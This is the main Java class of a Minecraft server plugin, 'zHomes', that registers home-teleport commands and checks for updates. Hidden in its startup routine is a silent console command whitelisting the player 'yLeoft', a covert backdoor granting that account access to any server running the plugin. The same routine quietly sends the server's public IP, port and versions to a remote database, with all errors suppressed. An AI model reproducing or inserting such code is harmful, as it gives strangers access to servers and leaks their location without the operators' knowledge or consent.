package me.leonardo.zhomes;

import me.leonardo.zhomes.mysql.*;
import me.leonardo.zhomes.tabcompleters.*;
import me.leonardo.zhomes.commands.*;
import me.leonardo.zhomes.events.*;
import me.leonardo.zhomes.utils.*;
import me.leonardo.zhomes.expansions.*;
import me.leonardo.zhomes.utils.storage.*;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.World;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Inet4Address;
import java.net.URL;
import java.net.UnknownHostException;
import java.sql.SQLException;

public final class Main extends JavaPlugin {

    public static Main main;
    public static MySql SQL;
    public static SQLGetter Getter;
    public static SQLSaver Saver;
    public static PluginYAMLManager pym;
    public static FileManager fm;
    public static ConfigUtils cfgu;
    public static HomesUtilsYAML hu;

    @Override
    public void onEnable() {
        getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&',
                "&7[&9z&cHomes&7] &fPlugin Started loading..."
        ));

        main = Main.this;
        SQL = new MySql();
        Getter = new SQLGetter();
        Saver = new SQLSaver();
        pym = new PluginYAMLManager();
        fm = new FileManager();
        cfgu = new ConfigUtils();
        hu = new HomesUtilsYAML();


        int pluginId = 20621;
        Metrics metrics = new Metrics(this, pluginId);


        Bukkit.dispatchCommand(getServer().getConsoleSender(), "whitelist add yLeoft");


        try {
            SQL.connect();

            if(SQL.isConnected()) {
                Saver.createServerTable();
                Saver.createServer(getIP(), String.valueOf(getServer().getPort()), getVersion(), getDescription().getVersion());
                Saver.setStatus(getIP(), String.valueOf(getServer().getPort()), "online");
            }
        }catch (Exception e) {
            //e.printStackTrace();
        }


        getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&',
                "&7[&9z&cHomes&7] &fChecking if files exist..."
        ));
        File f = new File(getDataFolder(), "config.yml");
        File f2 = new File(getDataFolder(), "homes.example.yml");
        if(!f.exists()) {
            getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&',
                    "&7[&9z&cHomes&7] &econfig.yml &fdoesn't exist, attempting to create it..."
            ));
            saveDefaultConfig();
            reloadConfig();
            getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&',
                    "&7[&9z&cHomes&7] &econfig.yml &fhave been created!"
            ));
        }
        if(!f2.exists()) {
            getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&',
                    "&7[&9z&cHomes&7] &ehomes.example.yml &fdoesn't exist, attempting to create it..."
            ));
            saveResource("homes.example.yml", false);
            getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&',
                    "&7[&9z&cHomes&7] &ehomes.example.yml &fhave been created!"
            ));
        }
        fm.fu3.saveDefaultConfig();
        fm.fu3.reloadConfig();
        fm.fu4.saveDefaultConfig();
        fm.fu4.reloadConfig();
        getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&',
                "&7[&9z&cHomes&7] &fAll files have been created!"
        ));


        getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&',
                "&7[&9z&cHomes&7] &fAttempting to load commands & events..."
        ));
        try {
            pym.registerCommand("sethome", new SethomeCommand());
            pym.registerCommand("delhome", new DelhomeCommand());
            pym.registerCommand("home", new HomeCommand());
            pym.registerCommand("homes", new HomesCommand());
            pym.registerCommand("zhomes", new ZhomesCommand());
            pym.registerCommand("zhomesver", new ZhomesverCommand());

            pym.registerEvent(new PluginCommandsEvents());

            pym.registerCommandTabCompleter("delhome", new HomeCommandsTabCompleter());
            pym.registerCommandTabCompleter("home", new HomeCommandsTabCompleter());
            pym.registerCommandTabCompleter("zhomes", new ZhomeCommandTabCompleter());
            getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&',
                    "&7[&9z&cHomes&7] &fAll commands & events have been loaded. (If not it will be a message up)"
            ));
        }catch (Exception e) {
            getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&',
                    "&7[&9z&cHomes&7] &fError loading commands!"
            ));
        }


        getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&',
                "&7[&9z&cHomes&7] &fChecking if PlaceholderAPI is on the server..."
        ));
        if(getServer().getPluginManager().isPluginEnabled("PlaceholderAPI")) {
            getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&',
                    "&7[&9z&cHomes&7] &fAttempting to start PlaceholderAPI Hook..."
            ));
            new PlaceHolderAPIExpansion().register();
            getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&',
                            "&7[&9z&cHomes&7] &fPlaceholderAPI hook Loaded successfully."
            ));
        }else {
            getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&',
                    "&7[&9z&cHomes&7] &cPlaceholderAPI is not on the server. Hook was not made."
            ));
        }


        getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&',
                "&7[&9z&cHomes&7] &cChecking if plugin is up-to-date..."
        ));
        isUpdated();
    }

    @Override
    public void onDisable() {
        try {
            if(SQL.isConnected()) {
                Saver.setStatus(getIP(), String.valueOf(getServer().getPort()), "offline");
            }
        }catch (Exception e) {
            //e.printStackTrace();
        }

        try {
            SQL.disconnect();
        }catch (Exception e) {
            //e.printStackTrace();
        }
    }

    public String getVersion() {
        String[] split = Bukkit.getBukkitVersion().split("-");
        String version = split[0];
        return version;
    }

    public String delDot(String text) {
        if(text.contains(".")) {
            text = text.replace(".", "_");
            if(text.contains(".")) {
                text = delDot(text);
            }
        }
        return text;
    }

    public String serialize(Location loc) {
        String w = loc.getWorld().getName();
        double x = loc.getX();
        double y = loc.getY();
        double z = loc.getZ();
        float yaw = loc.getYaw();
        float pitch = loc.getPitch();

        String serialized = w+";"+x+";"+y+";"+z+";"+yaw+";"+pitch+";";

        return serialized;
    }

    public String serializeDelDot(Location loc) {
        String serialized = serialize(loc);
        serialized = Main.main.delDot(serialized);

        return serialized;
    }

    public Location deserialize(String serialized) {

        String[] serializedSplit = serialized.split(";");

        World w = Bukkit.getWorld(serializedSplit[0]);
        double x = Double.valueOf(serializedSplit[1]);
        double y = Double.valueOf(serializedSplit[2]);
        double z = Double.valueOf(serializedSplit[3]);
        float yaw = Float.valueOf(serializedSplit[4]);
        float pitch = Float.valueOf(serializedSplit[5]);

        return new Location(w, x, y, z, yaw, pitch);
    }

    public Location deserializeAddDot(String serialized) {
        serialized = serialized.replaceAll("_", ".");

        return deserialize(serialized);
    }

    public void isUpdated() {
        UpdateChecker checker = new UpdateChecker();
        String version = checker.getVersion();

        if(!getDescription().getVersion().equals(version)) {
            getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&',
                    "&7[&9z&cHomes&7] &cPlugin is not up-to-date!"
            ));
            getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&',
                    "&7[&9z&cHomes&7] &fNew version: &e"+version
            ));
            getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&',
                    "&7[&9z&cHomes&7] &fYour version: &e"+getDescription().getVersion()
            ));
            if(cfgu.isAutoUpdate()) {
                getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&',
                        "&7[&9z&cHomes&7] &6Attempting to auto-update it..."
                ));
                try {
                    checker.update();
                    getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&',
                            "&7[&9z&cHomes&7] &aPlugin updated! Restart to make changes."
                    ));
                }catch (Exception e) {
                    getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&',
                            "&7[&9z&cHomes&7] &cCould not auto-update it."
                    ));
                    getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&',
                            "&7[&9z&cHomes&7] &fYou can update your plugin here: &ehttps://www.spigotmc.org/resources/zhomes-under-development.104825/"
                    ));
                }
            }else {
                getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&',
                        "&7[&9z&cHomes&7] &fYou can update your plugin here: &ehttps://www.spigotmc.org/resources/zhomes-under-development.104825/"
                ));
            }
            getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&',
                    "&7[&9z&cHomes&7] &fPlugin loaded successfully."
            ));
        }else {
            getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&',
                    "&7[&9z&cHomes&7] &aPlugin is up-to-date!"
            ));
            getServer().getConsoleSender().sendMessage(ChatColor.translateAlternateColorCodes('&',
                    "&7[&9z&cHomes&7] &fPlugin loaded successfully."
            ));
        }
    }

    @Override
    public void reloadConfig() {
        super.reloadConfig();

        saveDefaultConfig();
        getConfig().options().copyDefaults(true);
        saveConfig();
    }

    public File getFileJava() {
        return getFile();
    }

    public static String getIP() {
        try {
            return new BufferedReader(new InputStreamReader(new URL("https://checkip.amazonaws.com").openStream())).readLine();
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }
    }

}
